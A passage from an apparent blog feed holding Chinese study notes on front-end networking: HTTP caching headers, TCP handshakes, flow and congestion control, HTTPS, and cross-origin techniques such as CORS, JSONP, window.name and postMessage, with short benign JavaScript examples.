...</span></span><br></pre></td></tr></table></figure><p>这种情况下，可能插件在暗地里会使用各种各样的服务，存在潜在的危险，一个解决方案就是创建一个单独的依赖注入容器，一种只注册我们想要暴露的服务，这样我们就能控制插件所能看到的主应用的东西。这也解释了依赖注入容器可以很好地实现封装和信息隐藏。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Wiring-Modules-连接模块&quot;&gt;&lt;a href=&quot;#Wiring-Modules-连接模块&quot; class=&quot;headerlink&quot; title=&quot;Wiring Modules(连接模块)&quot;&gt;&lt;/a&gt;Wiring Modules(连接模块)&lt;/h1&gt;&lt;p&gt;对模块常见的一个问题就是：将组件 X 的实例传递到模块 Y 的最佳方式是什么？&lt;/p&gt;
&lt;p&gt;常见的模式有一下几种：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;硬编码依赖&lt;/li&gt;
&lt;li&gt;依赖注入&lt;/li&gt;
&lt;li&gt;服务定位器&lt;/li&gt;
&lt;li&gt;依赖注入容器&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="读书笔记" scheme="http://1016990109.github.io/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>前端基础之网络</title>
    <link href="http://1016990109.github.io/2018/07/19/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%E4%B9%8B%E7%BD%91%E7%BB%9C/"/>
    <id>http://1016990109.github.io/2018/07/19/前端基础之网络/</id>
    <published>2018-07-19T08:20:00.000Z</published>
    <updated>2018-09-20T10:47:21.343Z</updated>
    
    <content type="html"><![CDATA[<h2 id="网络模型"><a href="#网络模型" class="headerlink" title="网络模型"></a>网络模型</h2><p><img src="/assets/img/network_model.png" alt="Network Model"></p><ul><li><code>TCP/IP</code> 四层模型</li></ul><p>应用层、运输层、网际层和网络接口层。从实质上讲，只有上边三层，网络接口层没有什么具体的内容。<code>HTTP</code> 对应应用层。</p><ul><li><code>OSI</code> 七层模型</li></ul><p>应用层（<code>Application</code>）、表示层（<code>Presentation</code>）、会话层（<code>Session</code>）、传输层（<code>Transport</code>）、网络层（<code>Network</code>）、数据链路层（<code>Data Link</code>）、物理层（<code>Physical</code>）。<code>HTTP</code> 也是对应应用层。</p><ul><li>五层模型</li></ul><p>应用层、运输层、网络层、数据链路层和物理层。</p><a id="more"></a><h2 id="强缓存与协商缓存"><a href="#强缓存与协商缓存" class="headerlink" title="强缓存与协商缓存"></a>强缓存与协商缓存</h2><h3 id="强缓存"><a href="#强缓存" class="headerlink" title="强缓存"></a>强缓存</h3><p>1.<code>Expires</code>：<br>服务器返回的一个时间，在这个时间之前都使用缓存，不发送 <code>http</code> 请求。</p><p>例如：<code>Expires: Thu, 10 Dec 2015 23:21:37 GMT</code></p><p><strong>缺点</strong>：服务器的时间和客户端不同会出现问题，老版本 <code>http 1.0</code> 中才使用，现在一般使用 <code>Cache-Contorl</code>。</p><p>2.<code>Cache-Control</code>(优先级高)：<br>声明一个相对的秒数，表示从现在起一段时间内缓存都有效，也不会发送 <code>http</code> 请求。</p><p>例如：<code>Cache-Control: max-age=3600</code></p><p><code>Cache-Control</code> 可以控制是否校验 <code>ETag</code> 等协商缓存。<code>no-store</code> 代表永远不缓存，每次都要向服务器请求新数据，是不会比较 <code>ETag</code> 的；而设置 <code>no-cache</code> 则是意味着不缓存过期的资源，所以每次还会向服务器确认资源是否修改，即通过<code>If-Modified-Since</code> 或者 <code>ETag</code> 来校验资源是否发生变化，<strong>是 <code>304</code> 的来源</strong>。</p><h3 id="协商缓存"><a href="#协商缓存" class="headerlink" title="协商缓存"></a>协商缓存</h3><p>1.<code>Last-Modified</code> / <code>If-Modified-Since</code>:<br>第一次请求一个资源时，服务器返回 <code>Last-Modified</code>(例如：<code>Last-Modified: Mon, 30 Nov 2015 23:21:37 GMT</code>)，下一次请求是客户端带上 <code>If-Modified-Since</code> 的 <code>header</code>。</p><p>例如 <code>If-Modified-Since: Mon, 30 Nov 2015 23:21:37 GMT</code>，如果资源没改变则返回 <code>304</code> 状态码。</p><p><strong>缺点</strong>：服务器可能频繁修改文件（<code>ms</code>级），而 <code>Last-Modified</code> 只能精确到秒，可能返回错误的状态码(已经变动却返回相同的时间)；服务器修改了文件但是内容没变化，只是修改时间变了，这个时候其实是不用更新缓存的，故而 <code>ETag</code> 更好。</p><p>2.<code>ETag</code> / <code>If-None-Match</code>(优先级高):<br>用一个 <code>ETag</code> 标记服务器的文件(可以用 <code>hash</code> 之类的算法计算)，如果 <code>ETag</code> 没变则服务器返回 <code>304</code> 状态码。</p><p>例如：服务器返回：<code>ETag: &quot;d41d8cd98f00b204e9800998ecf8427e&quot;</code>；客户端发送：<code>If-None-Match: W/&quot;d41d8cd98f00b204e9800998ecf8427e&quot;</code></p><h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><h3 id="三次握手建立连接"><a href="#三次握手建立连接" class="headerlink" title="三次握手建立连接"></a>三次握手建立连接</h3><p><img src="/assets/img/tcp_connect.png" alt="TCP connect"></p><ol><li>客户端请求建立 <code>TCP</code> 连接，标记 <code>SYN</code>(Synchronize Sequence Numbers，同步序列号) 为 <code>1</code>，并发送客户端的序列号 <code>x</code>，即 <code>SYN=1;seq=x</code>。发送完毕后，客户端进入 <code>SYN_SEND</code> 状态。</li><li>服务器收到后，标记 <code>ACK</code>(Acknowledgement) 为 <code>1</code>，返回一个确认码 <code>ack</code>，值为客户端序列号加 <code>1</code>，并发送自己的同步序列号 <code>y</code> 给客户端，即 <code>SYN=1;seq=y;ACK=1;ack=x+1</code>。发送完毕后，服务器端进入 <code>SYN_RCVD</code> 状态，一段时间后没收到回复，自动尝试 5 次重新发送确认报文，每次时间间隔指数递增(1s,2s,4s,8s,16s)，第 5 次后等待 31s 后(总共 63s)才能断开连接。</li><li>客户端收到后需要告知服务器它收到了，同样发送确认码和序列号，即 <code>ACK=1;ack=y+1;seq=x+1</code>。发送完毕后，客户端进入 <code>ESTABLISHED</code> 状态，当服务器端接收到这个包时，也进入 <code>ESTABLISHED</code> 状态，TCP 握手结束。</li></ol><blockquote><p>注意：客户端发送每次 <code>TCP</code> 报文时 <code>seq</code> 都会递增 <code>1</code>，便于收到报文后确认报文发送的先后顺序。第三次握手不需要发送 <code>SYN=1</code> 信号，因为不是初始建立连接状态，如果标记为 <code>1</code> 那么服务器又会认为是建立一个新连接了。</p></blockquote><h3 id="四次握手关闭连接-以客户端发起关闭为例"><a href="#四次握手关闭连接-以客户端发起关闭为例" class="headerlink" title="四次握手关闭连接(以客户端发起关闭为例)"></a>四次握手关闭连接(以客户端发起关闭为例)</h3><p><img src="/assets/img/tcp_finish.png" alt="TCP finis"></p><ol><li>客户端请求关闭连接，标记 <code>FIN</code>(finish) 标记为 <code>1</code>，带上序列号 <code>u</code>，这个时候客户端还可以接收数据但是不再发送数据了。</li><li>服务器收到请求后标记 <code>ACK</code> 为 <code>1</code>，返回确认码 <code>u+1</code>，告诉客户端它收到了，服务器开始关闭连接（发送剩余数据等等操作）。</li><li>服务器等待关闭后(需要把没发完的发完)，向客户端发起关闭请求，标记 <code>FIN</code> 为 <code>1</code>，序列号为 <code>w</code>，这个时候服务器也不发送数据了。</li><li>客户端收到确认后，知道服务器关闭了，那么自己也不再接受数据了，标记 <code>ACK</code> 为 <code>1</code>，发送确认码 <code>w+1</code>，进入等待阶段，等待 <code>2MSL</code>(Maximum Segment Lifetime，最大报文生存周期)，保证服务器收到确认并已关闭了，客户端才可以放心关闭，如果继续收到服务器的数据，说明确认码未收到，需要再次向服务器发送，这就是等待 <code>2MSL</code> 的原因。</li></ol><blockquote><p>需要四次握手的原因，建立连接时服务器返回确认码时可以同时传输序列号 <code>SYN</code>，但是关闭连接时服务器可能还有剩余数据需要发送，所以先回复一个 <code>ACK</code> 告诉客户端它知道该关闭了只是需要做一些收尾，等到收尾工作做完（发送完剩余数据），再告诉客户端可以关闭了。</p></blockquote><h3 id="SYN-攻击"><a href="#SYN-攻击" class="headerlink" title="SYN 攻击"></a>SYN 攻击</h3><p>在三次握手过程中，服务器发送 <code>SYN-ACK</code> 之后，收到客户端的 <code>ACK</code> 之前的 <code>TCP</code> 连接称为半连接(<code>half-open connect</code>)。此时服务器处于 <code>SYN_RCVD</code> 状态。当收到 <code>ACK</code> 后，服务器才能转入 <code>ESTABLISHED</code> 状态.</p><p><code>SYN</code> 攻击指的是，攻击客户端在短时间内伪造大量不存在的 <code>IP</code> 地址，向服务器不断地发送 <code>SYN</code> 包，服务器回复确认包，并等待客户的确认。由于源地址是不存在的，服务器需要不断的重发直至超时，这些伪造的 <code>SYN</code> 包将长时间占用未连接队列，正常的 <code>SYN</code> 请求被丢弃，导致目标系统运行缓慢，严重者会引起网络堵塞甚至系统瘫痪。</p><p><code>SYN</code> 攻击是一种典型的 <code>DoS/DDoS</code> 攻击。防御可以限制最大半连接数、网关过滤、缩短超时时间等等。</p><h3 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h3><p>先来了解一下前提：</p><ol><li><code>TCP</code> 协议的两端分别为发送者 <code>A</code> 和接收者 <code>B</code>，由于是全双工协议，因此 <code>A</code> 和 <code>B</code> 应该分别维护着一个独立的发送缓冲区和接收缓冲区，由于对等性（<code>A</code> 发 <code>B</code> 收和 <code>B</code> 发 <code>A</code> 收），我们以 <code>A</code> 发送 <code>B</code> 接收的情况作为例子；</li><li>发送窗口是发送缓存中的一部分，是可以被 <code>TCP</code> 协议发送的那部分，其实应用层需要发送的所有数据都被放进了发送者的发送缓冲区；</li><li>发送窗口中相关的有四个概念：已发送并收到确认的数据（不再发送窗口和发送缓冲区之内）、已发送但未收到确认的数据（位于发送窗口之中）、允许发送但尚未发送的数据以及发送窗口外发送缓冲区内暂时不允许发送的数据。</li></ol><h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><p><code>TCP</code> 建立的开始，<code>B</code> 会告诉 <code>A</code> 自己的接受窗口大小，比如 <code>20</code>。</p><p><code>A</code> 发送 <code>11</code> 个字节后，发送窗口位置不变，<code>B</code> 接收到了乱序的数据分组：</p><p><img src="/assets/img/tcp_slide1.png" alt="TCP Slide 1"></p><p>只有当 <code>A</code> 成功发送了数据，即发送的数据得到了 <code>B</code> 的确认之后，才会移动滑动窗口离开已发送的数据；同时 <code>B</code> 则确认连续的数据分组，对于乱序的分组则先接收下来，避免网络重复传递：</p><p><img src="/assets/img/tcp_slide2.png" alt="TCP Slide 2"></p><h4 id="流量控制"><a href="#流量控制" class="headerlink" title="流量控制"></a>流量控制</h4><p>流量控制方面主要有两个要点需要掌握。一是 <code>TCP</code> 利用滑动窗口实现流量控制的机制；二是如何考虑流量控制中的传输效率。</p><p>1.流量控制</p><p>所谓流量控制，主要是接收方传递信息给发送方，使其不要发送数据太快，是一种端到端的控制。主要的方式就是返回的 <code>ACK</code> 中会包含自己的接收窗口的大小，并且利用大小来控制发送方的数据发送。</p><p>这里面涉及到一种情况，如果 <code>B</code> 已经告诉 <code>A</code> 自己的缓冲区已满，于是 <code>A</code> 停止发送数据；等待一段时间后，<code>B</code> 的缓冲区出现了富余，于是给 <code>A</code> 发送报文告诉 <code>A</code> 我的 <code>rwnd</code> 大小为 400，但是这个报文不幸丢失了，于是就出现 <code>A</code> 等待 <code>B</code> 的通知||<code>B</code> 等待 <code>A</code> 发送数据的死锁状态。为了处理这种问题，<code>TCP</code> 引入了持续计时器（<code>Persistence timer</code>），当 <code>A</code> 收到对方的零窗口通知时，就启用该计时器，时间到则发送一个 1 字节的探测报文，对方会在此时回应自身的接收窗口大小，如果结果仍未 0，则重设持续计时器，继续等待。</p><p>2.传递效率</p><p>单个发送字节单个确认，窗口有一个空余就通知对方，这未免也太浪费性能了，所以确认一般是批量确认一部分连续的，而窗口要等到空余较多的时候才通知对方发送。</p><ul><li>对于单发字节确认问题：</li></ul><p>使用 <code>Nagle</code> 算法：</p><p>a.要发送一段数据时候，先发送第一个数据字节，后面的数据先缓存。<br>b.等到收到确认后了解接收方的可接收窗口大小，再根据这个大小组织数据发送出去。<br>c.等到发送的数据有一半收到确认回复或者达到报文最大长度时，发送一个报文段。</p><ul><li>对于窗口空余问题：</li></ul><p>让接收方等待一段时间，或者接收方获得足够的空间容纳一个报文段或者等到接受缓存有一半空闲的时候，再通知发送方发送数据。</p><h4 id="拥塞控制"><a href="#拥塞控制" class="headerlink" title="拥塞控制"></a>拥塞控制</h4><p>拥塞控制就是防止过多的数据注入到网络中，这样可以使网络中的路由器或链路不致过载。常用的方法就是：</p><p>1.慢开始、拥塞控制：</p><p>通过图我们来一步步解释：</p><p><img src="/assets/img/tcp_slow_start.png" alt="TCP Slow Start"></p><ul><li>发送方维持一个“拥塞窗口”(<code>cwnd</code>,congestion window)的变量，与发送方的允许窗口大小(<code>rwnd</code>,receiver window)共同决定发送窗口大小，显然 <code>cwnd</code> 是不能超过 <code>rwnd</code> 的。</li><li>当开始发送数据时，避免一下子将大量字节注入到网络，造成或者增加拥塞，选择发送一个 1 字节的试探报文，收到确认后尝试发送 2 字节，收到确认再发 4 字节，等等，以此类推，以 2 的指数级增长。</li><li>最后回达到一个门限(<code>ssthresh</code>)，规则如下：<br><code>cwnd</code> &lt; <code>ssthresh</code>:继续 2 的指数增长。<br><code>cwnd</code> &gt;= <code>ssthresh</code>:拥塞避免方法，每次窗口大小只增加 1，而不是 2 的指数级增长。</li><li><p><strong>当出现拥塞时</strong>，比如丢包，也就是可能这个门限(<code>ssthresh</code>)可能设置过大了，那么把门限减少为原来的一般(<code>ssthresh/2</code>)，同时 <code>cwnd</code> 设为 1，重新开始指数级增长(慢开始)。</p><p>2.快重传、快恢复：</p></li></ul><p><img src="/assets/img/tcp_fast_start.png" alt="TCP Fast Restore"></p><ul><li>接收方建立这样的机制，如果一个包丢失，则对后续的包继续发送针对该包的重传请求。</li><li>一旦发送方接收到三个一样的确认，就知道该包之后出现了错误，立刻重传该包。</li><li>此时发送方开始执行“快恢复”算法：<br>门限设为一半，<code>cwnd</code> 直接从减少后的门限开始，即 <code>ssthresh/2</code>，之后每次收到确认递增 1 直到达到接收方的最大接收窗口大小(<code>rwnd</code>)。</li></ul><blockquote><p>这种方式能比较快的恢复传输，而不必要重新等待 <code>TCP</code> 的慢开始，现在 <code>TCP</code> 都是基于快重传的机制了，在 <code>TCP Tahoe</code> 版本是使用慢开始的，从 <code>TCP Reno</code> 版本开始使用快重传。</p></blockquote><h2 id="HTTP-80-端口-与-HTTPS-443-端口"><a href="#HTTP-80-端口-与-HTTPS-443-端口" class="headerlink" title="HTTP(80 端口) 与 HTTPS(443 端口)"></a>HTTP(80 端口) 与 HTTPS(443 端口)</h2><p><code>HTTPS</code> 是以安全为目标的 <code>HTTP</code> 通道，简单讲是 <code>HTTP</code> 的安全版，即 <code>HTTP</code> 下加入 <code>SSL</code>(<code>Secure Socekts Layer</code>) 层，<code>HTTPS</code> 的安全基础是 <code>SSL</code>，因此加密的详细内容就需要 <code>SSL</code>。</p><p>客户端拿到公玥(放在证书里)，用公钥锁定一个随机值并将随机值传给服务器，服务器用私钥解密(这是使用非对称加密的，更浪费时间)，以后就用这个随机值来传递数据(使用随机值作为对称加密的秘钥加密数据，对称加密要比非对称加密快得多)。</p><blockquote><p>如何确认是真正的服务器的公钥？权威机构颁发证书，操作系统内置了权威机构的公钥(或者后面自行安装的 <strong>根证书</strong>)，权威机构使用它的秘钥加密服务器的公钥和其他一些信息生成 <strong>数字证书</strong>，并使用 <strong>数字签名</strong>的方式对这个下发的证书做校验。客户端确认确实是服务器的公钥之后再使用该公钥非对称加密一个用来后续加密传输数据所用的对称加密的秘钥。</p></blockquote><blockquote><p>缺点：<code>HTTPS</code> 使页面加载时间延长，增加数据开销，经济开销，连接缓存问题。</p></blockquote><blockquote><p>关于如何从 <code>HTTP</code> 升级到 <code>HTTPS</code> 可以查看 <a href="http://www.ruanyifeng.com/blog/2016/08/migrate-from-http-to-https.html" target="_blank" rel="noopener">阮一峰——HTTPS 升级指南</a>。</p></blockquote><h2 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h2><ol><li><code>DOM</code> 同源策略：禁止对不同源页面 <code>DOM</code> 进行操作。这里主要场景是 <code>iframe</code> 跨域的情况，不同域名的 <code>iframe</code> 是限制互相访问的。</li><li><code>XMLHttpRequest</code> 同源策略：禁止使用 <code>XHR</code> 对象向不同源的服务器地址发起 <code>HTTP</code> 请求。</li></ol><blockquote><p>只要协议、域名、端口有任何一个不同，都被当作是不同的域，之间的请求就是跨域操作。</p></blockquote><h3 id="为什么要有跨域限制"><a href="#为什么要有跨域限制" class="headerlink" title="为什么要有跨域限制"></a>为什么要有跨域限制</h3><p><code>AJAX</code> 同源策略主要用来防止 <code>CSRF</code> 攻击。如果没有 <code>AJAX</code> 同源策略，相当危险，我们发起的每一次 <code>HTTP</code> 请求都会带上请求地址对应的 <code>cookie</code>，恶意网站模拟这个请求(拿到了用户登录过网站的 <code>cookie</code>)后就可以做一些坏事情了。</p><blockquote><p><code>CSRF</code>(<code>Cross-site request forgery</code>) 跨站请求伪造：跨站请求攻击，简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了 <code>web</code> 中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。</p></blockquote><h3 id="跨域解决方式"><a href="#跨域解决方式" class="headerlink" title="跨域解决方式"></a>跨域解决方式</h3><h4 id="跨域资源共享-CORS-cross-origin-resource-sharing"><a href="#跨域资源共享-CORS-cross-origin-resource-sharing" class="headerlink" title="跨域资源共享 CORS(cross origin resource sharing)"></a>跨域资源共享 CORS(cross origin resource sharing)</h4><p><code>CORS</code> 需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，<code>IE</code> 浏览器不能低于 <code>IE10</code>。</p><p>实现 <code>CORS</code> 通信的关键是服务器。只要服务器实现了 <code>CORS</code> 接口，就可以跨源通信。</p><h5 id="两种请求"><a href="#两种请求" class="headerlink" title="两种请求"></a>两种请求</h5><p>浏览器将 <code>CORS</code> 请求分成两类：简单请求（<code>simple request</code>）和非简单请求（<code>not-so-simple request</code>）。<br>只要同时满足以下两大条件，就属于简单请求。</p><ol><li>请求方法是以下三种方法之一：<code>HEAD</code>，<code>GET</code>，<code>POST</code>。</li><li><code>HTTP</code> 的头信息不超出以下几种字段：<code>Accept</code>，<code>Accept-Language</code>，<code>Content-Language</code>，<code>Last-Event-ID</code>，<code>Content-Type</code>(只限于三个值 <code>application/x-www-form-urlencoded</code>、<code>multipart/form-data</code>、<code>text/plain</code>)。</li></ol><h5 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h5><p>对于简单请求，浏览器直接发出 <code>CORS</code> 请求。具体来说，就是在头信息之中，增加一个 <code>Origin</code> 字段。</p><p>如果 <code>Origin</code> 指定的源，不在许可范围内，服务器会返回一个正常的 <code>HTTP</code> 回应。浏览器发现，这个回应的头信息没有包含 <code>Access-Control-Allow-Origin</code> 字段（详见下文），就知道出错了，从而抛出一个错误，被 <code>XMLHttpRequest</code> 的 <code>onerror</code> 回调函数捕获。注意，这种错误无法通过状态码识别，因为 <code>HTTP</code> 回应的状态码有可能是 <code>200</code>。</p><p>如果 <code>Origin</code> 指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。</p><blockquote><p>可能有的人会觉得那 <code>Origin</code> 的头部不是可以修改为服务器允许的源来完成危险的跨域请求么？需要注意的是，<strong>浏览器在内部会禁止修改 <code>Origin</code> 头部</strong>。</p></blockquote><ul><li><p><code>Access-Control-Allow-Origin</code><br>该字段是必须的。它的值要么是请求时 <code>Origin</code> 字段的值，要么是一个 <code>*</code>，表示接受任意域名的请求。</p></li><li><p><code>Access-Control-Allow-Credentials</code><br>该字段可选。它的值是一个布尔值，表示是否允许发送 <code>Cookie</code>。默认情况下，<code>Cookie</code> 不包括在 <code>CORS</code> 请求之中。设为 <code>true</code>，即表示服务器明确许可，<code>Cookie</code> 可以包含在请求中，一起发给服务器。这个值也只能设为 <code>true</code>，如果服务器不要浏览器发送 <code>Cookie</code>，删除该字段即可。</p></li><li><p><code>Access-Control-Expose-Headers</code><br>该字段可选。<code>CORS</code> 请求时，<code>XMLHttpRequest</code> 对象的 <code>getResponseHeader()</code> 方法只能拿到 6 个基本字段：<code>Cache-Control</code>、<code>Content-Language</code>、<code>Content-Type</code>、<code>Expires</code>、<code>Last-Modified</code>、<code>Pragma</code>。如果想拿到其他字段，就必须在 <code>Access-Control-Expose-Headers</code> 里面指定。</p></li></ul><blockquote><p><code>CORS</code> 请求默认不发送 <code>Cookie</code> 和 <code>HTTP</code> 认证信息。如果要把 <code>Cookie</code> 发到服务器，一方面要服务器同意，指定 <code>Access-Control-Allow-Credentials</code> 字段为 <code>true</code> 且 <code>Access-Control-Allow-Origin</code> 不能设为星号，同时在 <code>AJAX</code> 请求中打开 <code>withCredentials</code> 属性。</p></blockquote><h5 id="非简单请求"><a href="#非简单请求" class="headerlink" title="非简单请求"></a>非简单请求</h5><p>非简单请求是那种对服务器有特殊要求的请求，比如请求方法是 <code>PUT</code> 或 <code>DELETE</code>，或者 <code>Content-Type</code> 字段的类型是 <code>application/json</code>。</p><p>非简单请求的 <code>CORS</code> 请求，会在正式通信之前，增加一次 <code>HTTP</code> 查询请求，称为”预检”请求（<code>preflight</code>）。</p><p>“预检”请求用的请求方法是 <code>OPTIONS</code>，表示这个请求是用来询问的。头信息里面，关键字段是 <code>Origin</code>，表示请求来自哪个源。</p><p>除了 <code>Origin</code> 字段，”预检”请求的头信息包括两个特殊字段。</p><ul><li><p><code>Access-Control-Request-Method</code><br>该字段是必须的，用来列出浏览器的 <code>CORS</code> 请求会用到哪些 <code>HTTP</code> 方法</p></li><li><p><code>Access-Control-Request-Headers</code><br>该字段是一个逗号分隔的字符串，指定浏览器 <code>CORS</code> 请求会额外发送的头信息字段</p></li></ul><p>“预检” 返回的结果除了 <code>Access-Control-Allow-Origin</code> 和 <code>Access-Control-Allow-Credentials</code> 与简单请求一样，还多两个字段：</p><p>1.<code>Access-Control-Allow-Methods</code>：该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次”预检”请求。 2.<code>Access-Control-Max-Age</code>：该字段可选，用来指定本次预检请求的有效期，单位为秒。例如 <code>1728000</code>，即允许缓存该条回应 1728000 秒（即 20 天），在此期间，不用发出另一条预检请求。</p><h4 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h4><p>动态添加一个 <code>&lt;script&gt;</code> 标签，而 <code>script</code> 标签的 <code>src</code> 属性是没有跨域的限制的。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">jsonpCallback</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">            alert(result.msg);</span><br><span class="line">        &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/告诉服务器端的js代码这边的回调函数是jsonpCallback，下载的js文件会直接运行，运行回调函数把数据传回来</span></span><br><span class="line"><span class="regexp">&lt;script type="text/</span>javascript<span class="string">" src="</span>http:<span class="comment">//crossdomain.com/jsonServerResponse?jsonp=jsonpCallback"&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>优点：它不像 <code>XMLHttpRequest</code> 对象实现的 <code>Ajax</code> 请求那样受到同源策略的限制；它的兼容性更好，在更加古老的浏览器中都可以运行，不需要 <code>XMLHttpRequest</code> 或 <code>ActiveX</code> 的支持；并且在请求完毕后可以通过调用 <code>callback</code> 的方式回传结果。</p><p>缺点：它只支持 <code>GET</code> 请求而不支持 <code>POST</code> 等其它类型的 <code>HTTP</code> 请求；它只支持跨域 <code>HTTP</code> 请求这种情况，不能解决不同域的两个页面之间如何进行 <code>JavaScript</code> 调用的问题。</p><h4 id="服务器代理"><a href="#服务器代理" class="headerlink" title="服务器代理"></a>服务器代理</h4><p>浏览器有跨域限制，但是服务器不存在跨域问题，所以可以由服务器请求所要域的资源再返回给客户端。</p><p>服务器代理是万能的。</p><h4 id="document-domain"><a href="#document-domain" class="headerlink" title="document.domain"></a>document.domain</h4><p>对于主域名相同，而子域名不同的情况，可以使用 <code>document.domain</code> 来跨域 这种方式非常适用于 <code>iframe</code> 跨域的情况，主域名指的是一级域名（如：<code>baidu.com</code>，<code>qq.com</code> 而不是 <code>www.baidu.com</code>之类的），跨域的时候需要两边都设置 <code>document.domain = ***</code>。</p><h4 id="window-name"><a href="#window-name" class="headerlink" title="window.name"></a>window.name</h4><p>页面如果设置了 <code>window.name</code>，那么在不关闭页面的情况下，即使进行了页面跳转 <code>location.href=...</code>，这个 <code>window.name</code> 还是会保留。</p><p>利用 <code>window.name</code> 的性质，我们可以在 <code>iframe</code> 中加载一个跨域页面。这个页面载入之后，让它设置自己的 <code>window.name</code>，然后再让它进行当前页面的跳转，跳转到与 <code>iframe</code> 外的页面同域的页面，此时 <code>window.name</code> 是不会改变的。这样，<code>iframe</code> 内外就属于同一个域了，且 <code>window.name</code> 还是跨域的页面所设置的值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//a页面的代码</span></span><br><span class="line">iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>)</span><br><span class="line">iframe.style.display = <span class="string">'none'</span></span><br><span class="line"><span class="keyword">var</span> state = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">iframe.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (state === <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">//第二次监听onload，说明iframe已经第二次跳转和当前域一样了，这时候可以取window.name的值了</span></span><br><span class="line">    <span class="keyword">var</span> data = iframe.contentWindow.name</span><br><span class="line">    <span class="built_in">console</span>.log(data)</span><br><span class="line">    iframe.contentWindow.document.write(<span class="string">''</span>)</span><br><span class="line">    iframe.contentWindow.close()</span><br><span class="line">    <span class="built_in">document</span>.body.removeChild(iframe)</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (state === <span class="number">0</span>) &#123;</span><br><span class="line">    state = <span class="number">1</span></span><br><span class="line">    iframe.contentWindow.location = <span class="string">'http://m.zhuanzhuan.58.com:8887/b.html'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(iframe)</span><br><span class="line"></span><br><span class="line"><span class="comment">//b页面代码</span></span><br><span class="line"><span class="built_in">window</span>.name = <span class="string">'hello'</span></span><br></pre></td></tr></table></figure><h4 id="location-hash"><a href="#location-hash" class="headerlink" title="location.hash"></a>location.hash</h4><p>很少用，和 <code>window.name</code> 一样，因为子 <code>iframe</code> 有修改父框架的 <code>location.hash</code> 的权限，从而传递值，不过大小有限。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//a页面代码相同</span></span><br><span class="line"><span class="comment">//b页面</span></span><br><span class="line">parent.location.hash = <span class="string">'hello'</span></span><br></pre></td></tr></table></figure><h4 id="postMessage-实现页面间通信"><a href="#postMessage-实现页面间通信" class="headerlink" title="postMessage 实现页面间通信"></a>postMessage 实现页面间通信</h4><p>语法：<code>otherWindow.postMessage(message, targetOrigin, [transfer])</code></p><p>接收消息：<code>window.addEventListener(&quot;message&quot;, receiveMessage, false)</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">receiveMessage</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="comment">//some code</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>如果不是使用 <code>window.open()</code> 打开的页面或者 <code>iframe</code> 嵌入的页面，就跟当前页面扯不上任何关系，是无法使用 <code>window.postMessage()</code> 进行跨域通信的！</p></blockquote><blockquote><p><code>window.postMessage()</code> 中的 <code>window</code> 始终是你要通信的目标页面的 <code>window</code>，也就是 <code>PageA</code> 想法发送信息到 <code>PageB</code> 那么这个 <code>window</code> 就是 <code>PageB</code> 的 <code>window</code> 即 <code>iframe.contentWindow</code>，相反就是 <code>top</code> 或 <code>parent</code>。</p></blockquote><blockquote><p>一个很方便的回复消息的方式就是通过 <code>event.source</code> 来回复，<code>event.source</code> 就是发送消息的窗体。</p></blockquote><h2 